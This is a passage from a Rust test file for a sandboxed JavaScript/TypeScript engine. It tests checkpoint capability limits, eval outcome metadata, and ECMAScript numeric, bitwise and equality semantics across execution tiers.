        "#,
        SandboxEvalOptions {
            max_checkpoints: Some(2),
            ..Default::default()
        },
    );
    assert!(!max_exceeded.ok);
    assert_eq!(max_exceeded.checkpoints_taken, 2);
    assert!(
        max_exceeded
            .violation
            .unwrap_or_default()
            .contains("max_checkpoints"),
        "Expected max_checkpoints violation"
    );

    // 3. Parent with checkpoints disabled cannot have child re-enable them via Slice.evalSandbox
    let no_cp_parent_outcome = iso.eval_sandbox(
        r#"
        const child = Slice.evalSandbox("Slice.checkpoint()", { checkpoints: true });
        child.ok ? "escaped" : child.violation
        "#,
        SandboxEvalOptions {
            checkpoints: Some(false),
            ..Default::default()
        },
    );
    assert!(no_cp_parent_outcome.ok);
    assert!(
        no_cp_parent_outcome
            .return_value
            .contains("CapabilityDenied: checkpoints"),
        "Got: {}",
        no_cp_parent_outcome.return_value
    );
}

#[test]
fn test_issue_14_richer_sandbox_eval_outcome_phase_timings_and_return_json() {
    use crate::SandboxEvalOptions;

    let mut iso = SliceIsolate::spawn(
        "issue-14-parent",
        114,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );

    // 1. Object return value provides valid JSON in return_json plus non-zero phase timings
    let obj_out = iso.eval_sandbox(
        "const res = { a: 1, b: [2, 3], ok: true }; res",
        SandboxEvalOptions::default(),
    );
    assert!(obj_out.ok);
    assert!(obj_out.error.is_none());
    assert!(obj_out.violation.is_none());
    assert!(obj_out.spawn_time_ns >= 1);
    assert!(obj_out.compile_time_ns >= 1);
    assert!(obj_out.exec_time_ns >= 1);
    assert!(obj_out.peak_memory_bytes >= obj_out.memory_used_bytes);
    let parsed_json: serde_json::Value = serde_json::from_str(
        obj_out
            .return_json
            .as_deref()
            .expect("expected return_json"),
    )
    .expect("valid JSON");
    assert_eq!(parsed_json["a"], 1);
    assert_eq!(parsed_json["b"], serde_json::json!([2, 3]));
    assert_eq!(parsed_json["ok"], true);

    // 2. Undefined return value yields return_json: None
    let undef_out = iso.eval_sandbox("let x = 1; undefined", SandboxEvalOptions::default());
    assert!(undef_out.ok);
    assert_eq!(undef_out.return_value, "undefined");
    assert!(undef_out.return_json.is_none());
}

#[test]
fn test_tier2_ieee754_equality_nan_infinity_subnormal_and_signed_zero() {
    let src = r#"
function checkEq(a: number, b: number): number {
    let mask = 0;
    if (a === b) mask = mask | 1;
    if (a !== b) mask = mask | 2;
    if (a == b)  mask = mask | 4;
    if (a != b)  mask = mask | 8;
    return mask;
}
const nanVal = 0 / 0;
const posInf = 1 / 0;
const negInf = -1 / 0;
// 1. NaN vs NaN: === is false (0), !== is true (2), == is false (0), != is true (8) -> 10
const rNan = checkEq(nanVal, nanVal);
// 2. +Infinity vs +Infinity: === is true (1), !== is false (0), == is true (4), != is false (0) -> 5
const rInf = checkEq(posInf, posInf);
// 3. +Infinity vs -Infinity -> 10
const rInfSign = checkEq(posInf, negInf);
// 4. -0.0 vs +0.0 -> 5
const rZero = checkEq(-0.0, 0.0);
// 5. Sub-epsilon distinct floats (1e-17 vs 0.0) -> 10 (not equal!)
const rTiny = checkEq(1e-17, 0.0);
console.log(rNan, rInf, rInfSign, rZero, rTiny);
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier2-ieee754-eq",
        201,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(metrics.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    assert_eq!(metrics.stdout[0], "10 5 10 5 10");
}

#[test]
fn test_tier0_and_tier2_ecmascript_32bit_bitwise_toint32_touint32_and_ushr() {
    let src = r#"
function bitwiseKernel(x: number, y: number): number {
    const shl31 = 1 << 31;
    const ushr31 = (1 << 31) >>> 0;
    const allOnesSigned = 0xffffffff | 0;
    const allOnesUnsigned = 0xffffffff >>> 0;
    const wrap32 = 4294967296 | 0;
    const negShift = 1 << -1;
    const notZero = ~0;
    const notNegOne = ~(-1);
    const notFloat = ~3.9;
    const infOrZero = (1 / 0) | 0;
    const nanOrZero = (0 / 0) | 0;
    let h = 2166136261 | 0;
    for (let i = 0; i < 8; i++) {
        h = h ^ ((x + i) & 0xff);
        h = Math.imul(h, 16777619);
    }
    const hashUnsigned = h >>> 0;
    if (shl31 === -2147483648 &&
        ushr31 === 2147483648 &&
        allOnesSigned === -1 &&
        allOnesUnsigned === 4294967295 &&
        wrap32 === 0 &&
        negShift === -2147483648 &&
        notZero === -1 &&
        notNegOne === 0 &&
        notFloat === -4 &&
        infOrZero === 0 &&
        nanOrZero === 0) {
        return hashUnsigned + (y % 7);
    }
    return -999;
}
const res = bitwiseKernel(42, 19);
console.log(res);
"#;
    // 1. Execute on Tier-0/Tier-2 SLICESNP
    let bc_snp = compile_source_to_bytecode(src);
    assert_eq!(&bc_snp[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso_snp = SliceIsolate::spawn(
        "tier2-bitwise",
        202,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m_snp = iso_snp.execute_bytecode(&bc_snp, None).unwrap();
    assert_eq!(m_snp.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // 2. Execute on Tier-1 Boa and verify 100% bit-exact parity
    crate::set_thread_tier_override(Some(1));
    let bc_boa = compile_source_to_bytecode(src);
    crate::set_thread_tier_override(None);
    let mut iso_boa = SliceIsolate::spawn(
        "tier1-bitwise-parity",
        203,
        CapabilityToken::pure_compute(),
        1_000_000,
        2 * 1024 * 1024,
    );
    let m_boa = iso_boa.execute_bytecode(&bc_boa, None).unwrap();
    assert_eq!(m_snp.stdout[0], m_boa.stdout[0]);
    assert_ne!(m_snp.stdout[0], "-999");
}

#[test]
fn test_tier2_short_circuit_logical_and_or_with_side_effects_and_recursion() {
    let src = r#"
function shortCircuitKernel(n: number): number {
    let sideEffect = 0;
    const a = 0 && (sideEffect += 100);
    const b = 1 || (sideEffect += 200);
    const c = 0 || 42;
    const d = 5 && 99;
    let x = n;
    x = (x > 0) && (x + 10);
    return sideEffect * 1000 + a + b + c + d + x;
}
function recCountdown(n: number): number {
    return (n > 0) && (1 + recCountdown(n - 1));
}
console.log(shortCircuitKernel(7), recCountdown(15));
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier2-short-circuit",
        204,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    // sideEffect=0, a=0, b=1, c=42, d=99, x=17 -> 0 + 0 + 1 + 42 + 99 + 17 = 159; recCountdown(15) = 15
    assert_eq!(m.stdout[0], "159 15");
}

#[test]
fn test_tier0_and_tier2_prefix_vs_postfix_increment_decrement() {
    let src = r#"
function updateNuances(start: number): number {
    let x = start;
    const a = x++;
    const b = ++x;
    const c = x--;
    const d = --x;
    let acc = 0;
    for (let i = 0; i < 5; i++) {
        acc += i;
    }
    return a * 1000 + b * 100 + c * 10 + d + acc + x;
}
let top = 5;
const postTop = top++;
const preTop = ++top;
console.log(updateNuances(10), postTop, preTop, top);
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier2-prefix-postfix",
        205,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    // a=10, b=12, c=12, d=10, acc=10, x=10 -> 10000 + 1200 + 120 + 10 + 10 + 10 = 11350
    // postTop=5, preTop=7, top=7
    assert_eq!(m.stdout[0], "11350 5 7 7");
}

#[test]
fn test_tier0_and_tier2_math_round_ties_to_pos_inf_and_extended_math_intrinsics() {
    let src = r#"
function mathNuances(x: number): number {
    const rNegHalf = Math.round(-0.5);
    const negZeroCheck = 1 / rNegHalf;
    const rNeg3Half = Math.round(-3.5);
    const rPosHalf = Math.round(0.5);
    const rBelowHalf = Math.round(0.49999999999999994);
    const tNeg = Math.trunc(-3.9);
    const sNeg = Math.sign(-42);
    const clz = Math.clz32(1);
    const maxSign = 1 / Math.max(-0.0, 0.0);
    const minSign = 1 / Math.min(-0.0, 0.0);
    const maxNan = Math.max(0 / 0, 5);
    if (negZeroCheck === -1 / 0 &&
        rNeg3Half === -3 &&
        rPosHalf === 1 &&
        rBelowHalf === 0 &&
        tNeg === -3 &&
        sNeg === -1 &&
        clz === 31 &&
        maxSign === 1 / 0 &&
        minSign === -1 / 0 &&
        maxNan !== maxNan) {
        return x + clz;
    }
    return -1;
}
console.log(mathNuances(11), isNaN(Math.min(1, 0 / 0)), isFinite(Math.SQRT2));
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier2-math-nuances",
        206,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    assert_eq!(m.stdout[0], "42 true true");
}

#[test]
fn test_tier2_register_allocator_local_vars_in_branches_and_many_statements() {
    let src = r#"
function branchLocalsAndManyStmts(n: number): number {
    let total = 0;
    if (n > 0) {
        let innerA = n * 2;
        let innerB = innerA + 3;
        total += (innerA + 1) * (innerB - 1);
    } else {
        let innerC = 99;
        total += innerC;
    }
    for (let i = 0; i < 4; i++) {
        let stepVal = (i + 1) * (n + 2) + (i * 3);
        total += stepVal;
    }
    // Execute 20 sequential compound expressions to verify scratch register recycling
    total += (n + 1) * (n + 2) - (n + 3);
    total += (n + 2) * (n + 3) - (n + 4);
    total += (n + 3) * (n + 4) - (n + 5);
    total += (n + 4) * (n + 5) - (n + 6);
    total += (n + 5) * (n + 6) - (n + 7);
    total += (n + 6) * (n + 7) - (n + 8);
    total += (n + 7) * (n + 8) - (n + 9);
    total += (n + 8) * (n + 9) - (n + 10);
    total += (n + 9) * (n + 10) - (n + 11);
    total += (n + 10) * (n + 11) - (n + 12);
    total += (n + 11) * (n + 12) - (n + 13);
    total += (n + 12) * (n + 13) - (n + 14);
    total += (n + 13) * (n + 14) - (n + 15);
    total += (n + 14) * (n + 15) - (n + 16);
    total += (n + 15) * (n + 16) - (n + 17);
    total += (n + 16) * (n + 17) - (n + 18);
    return total;
}
console.log(branchLocalsAndManyStmts(5));
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier2-reg-alloc",
        207,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // Verify parity against Tier-1 Boa
    crate::set_thread_tier_override(Some(1));
    let bc_boa = compile_source_to_bytecode(src);
    crate::set_thread_tier_override(None);
    let mut iso_boa = SliceIsolate::spawn(
        "tier1-reg-alloc-parity",
        208,
        CapabilityToken::pure_compute(),
        1_000_000,
        2 * 1024 * 1024,
    );
    let m_boa = iso_boa.execute_bytecode(&bc_boa, None).unwrap();
    assert_eq!(m.stdout[0], m_boa.stdout[0]);
}

#[test]
fn test_tier0_nuances_abstract_equality_array_methods_negative_index_and_scope_shadowing() {
    let src = r#"
function recStringBuilder(n: number): string {
    if (n <= 0) return "0";
    let step = "s" + n;
    let sub = recStringBuilder(n - 1);
    return step + ":" + sub;
}
let step = "outer-preserved";
const tree = recStringBuilder(3);

const eq1 = (null == undefined);
const eq2 = (null === undefined);
const eq3 = ("42" == 42);
const eq4 = ("42" === 42);
const eq5 = (true == 1);

const arr = [2, 3, 4];
const prodNoInit = arr.reduce((a, b) => a * b);
const nanArr = [1, 0 / 0, 3];
const hasNan = nanArr.includes(0 / 0);
const joinedNulls = [1, null, undefined, 2].join(",");
const negIdx = arr[-1];
const fracIdx = arr[1.5];

console.log(step, tree, eq1, eq2, eq3, eq4, eq5, prodNoInit, hasNan, joinedNulls, negIdx, fracIdx);
"#;
    let bc = compile_source_to_bytecode(src);
    assert_eq!(&bc[0..8], crate::SNAPSHOT_MAGIC);
    let mut iso = SliceIsolate::spawn(
        "tier0-js-nuances",
        209,
        CapabilityToken::pure_compute(),
        1_000_000,
        512 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m.stdout[0],
        "outer-preserved s3:s2:s1:0 true false true false true 24 true 1,,,2 undefined undefined"
    );
}
